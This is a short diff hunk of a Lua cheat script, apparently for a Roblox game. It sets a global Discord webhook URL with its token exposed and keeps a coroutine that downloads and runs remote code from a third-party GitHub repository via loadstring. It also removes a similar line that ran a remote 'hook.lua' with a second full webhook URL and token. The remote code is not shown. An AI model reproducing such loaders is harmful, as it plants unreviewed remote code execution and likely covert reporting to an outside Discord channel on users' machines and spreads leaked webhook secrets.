@@ -18,7 +18,7 @@ getgenv().Webhook = "https://discord.com/api/webhooks/1269385646578073612/hAwLlz
 coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Webhook/main/Notifer.lua"))()
 end)()
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX/OneCreatorX/main/Scripts/web/hook.lua"))()("https://discord.com/api/webhooks/1269383717567336604/dfE9AkUmFV__FB8oY52FRJ5mXdhOghSyvqh8Z7ykfmvD6U-VMpFqbgQ2alzhnTJsY_vc")()
+
 
 if game.PlaceId == 2753915549 then
     World1 = true
